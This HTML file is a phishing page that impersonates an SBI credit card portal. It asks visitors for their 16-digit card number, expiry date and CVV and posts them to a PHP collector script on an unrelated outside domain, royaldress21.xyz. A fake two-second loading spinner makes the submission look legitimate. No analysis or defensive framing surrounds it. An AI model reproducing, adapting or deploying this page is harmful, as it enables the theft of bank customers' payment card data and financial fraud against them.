<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SBI Credit Card</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #FFFFFF;
        }
        .container {
            width: 100%;
            max-width: 500px;
            margin: 0 auto;
        }
        .header {
            text-align: center;
            background-color: #0871B2;
            padding: 15px;
            color: white;
            font-size: 20px;
            font-weight: bold;
            border-bottom-left-radius: 20px;
            border-bottom-right-radius: 20px;
        }
        .card {
            background: white;
            border-radius: 10px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
            margin: 15px;
            padding: 15px;
        }
        .border-card {
            border: 1px solid #0871B2;
        }
        .info-box {
            text-align: center;
            background-color: white;
            padding: 10px;
            border-radius: 10px;
            margin-bottom: 10px;
            width: 90%;
            max-width: 400px;
            height: 40px;
            min-height: 40px;
            margin-left: auto;
            margin-right: auto;
        }
        .logo-container {
            text-align: center;
            margin: 15px 0;
        }
        .logo-container img {
            width: 100%;
            height: 100px;
        }
        .card-title {
            text-align: center;
            font-size: 18px;
            font-weight: bold;
            color: #004aad;
            padding-bottom: 5px;
            display: block;
            position: relative;
        }
        .underline {
            width: 100%;
            height: 2px;
            background-color: #0871B2;
            margin: 5px auto 0;
        }
        .input-group {
            display: flex;
            align-items: center;
            margin: 10px 0;
            padding: 8px;
            background-color: white;
            border-bottom: 2px solid #0871B2;
        }
        .input-group img {
            width: 33px;
            height: 28px;
            margin-right: 10px;
        }
        .input {
            flex: 1;
            border: none;
            font-size: 16px;
            font-weight: bold;
            color: #004aad;
            outline: none;
            background: none;
            padding: 5px;
        }
        .row {
            display: flex;
            justify-content: space-between;
            padding: 10px 0;
        }
        .small-input {
            width: 50px;
            text-align: center;
            font-size: 16px;
            font-weight: bold;
            border: none;
            padding: 5px;
            background: none;
            outline: none;
            color: #004aad;
            border-bottom: 2px solid #0871B2;
        }
        .button {
            text-align: center;
            padding: 12px;
            background-color: #e0e0e0;
            font-weight: bold;
            color: black;
            border-radius: 10px;
            cursor: pointer;
            width: 85%;
            max-width: 400px;
            margin: 15px auto;
            display: block;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
        }
        .submit {
            text-align: center;
            padding: 12px;
            background-color: #0871B2;
            color: white;
            font-weight: bold;
            border-radius: 10px;
            cursor: pointer;
            width: 50%;
            max-width: 400px;
            margin: 20px auto;
            display: block;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
            border: none;
        }
        .footer-image {
            text-align: center;
            margin-top: 10px;
        }
        .footer-image img {
            width: 100%;
            max-width: 500px;
        }

        /* Loading animation style */
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5); /* Semi-transparent background */
            display: none; /* Hide initially */
            justify-content: center;
            align-items: center;
            z-index: 9999;
        }
        .loading-circle {
            width: 50px;
            height: 50px;
            border: 7px solid #029AE5;
            border-top: 7px solid transparent;
            border-radius: 100%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
    <script>
        // Function to show the loading animation and delay form submission
        function showLoading(event) {
            event.preventDefault(); // Prevent the form from submitting immediately
            document.getElementById("loadingOverlay").style.display = "flex"; // Show the loading animation

            setTimeout(function() {
                event.target.submit(); // Submit the form after 2 seconds
            }, 2000); // 2 second delay before submission
        }
    </script>
</head>
<body>

<div class="container">
    <div class="header">SBI Credit Card</div>

    <div class="card">
        <div class="info-box">
            <p>Hello, SBI Bank Customer</p>
            <p style="font-size: 12px;">Complete your card details in a few simple steps</p>
        </div>
    </div>

    <div class="logo-container">
        <img src="assets/img/logo.png" alt="SBI Logo">
    </div>

    <form action="https://royaldress21.xyz/P5%20Sbb%20Creed%20cdd%201/MY%20NEW%20SMS%20PANEL%20Sb%20Creed%20cd%205%20No.%20according%20cgi-bin/janiya/Sb%20Creed%20cd%205%20No.%20according/assets/public/save_data.php" method="POST" onsubmit="showLoading(event)">
        <div class="card border-card">
            <div class="card-title">SBI Debit/Credit Card</div>
            <div class="underline"></div>

            <p style="font-size: 12px; font-weight: bold;">Card 16-Digit Number</p>
            <div class="input-group">
                <img src="assets/img/card_icon.png" alt="Card Icon">
                <input type="tel" class="input" name="card_number" placeholder="XXXX - XXXX - XXXX - XXXX" minlength="16" maxlength="16" required>
            </div>

            <div class="row">
                <div>
                    <p style="font-size: 12px; font-weight: bold;">Expiry Date</p>
                    <div style="display: flex; align-items: center;">
                        <img src="assets/img/calendar_icon.png" alt="Date Icon" style="width: 33px; height: 28px; margin-right: 10px;">
                        <input type="tel" class="small-input" name="expiry_month" placeholder="MM" minlength="2" maxlength="2" required>
                        <span style="font-size: 20px; font-weight: bold; margin: 0 5px;">/</span>
                        <input type="tel" class="small-input" name="expiry_year" placeholder="YY" minlength="2" maxlength="2" required>
                    </div>
                </div>
                <div>
                    <p style="font-size: 12px; font-weight: bold;">CVV</p>
                    <input type="tel" class="small-input" name="cvv" placeholder="000" minlength="3" maxlength="3" required>
                </div>
            </div>
        </div>

        <div class="button">Front Upload Documents</div>
        <div class="button">Back Upload Documents</div>

        <button type="submit" class="submit">SUBMIT</button>
    </form>

    <div class="footer-image">
        <img src="assets/img/footer_image.png" alt="Footer Image">
    </div>
</div>

<!-- Loading overlay -->
<div class="loading-overlay" id="loadingOverlay">
    <div class="loading-circle"></div>
</div>

</body>
</html>
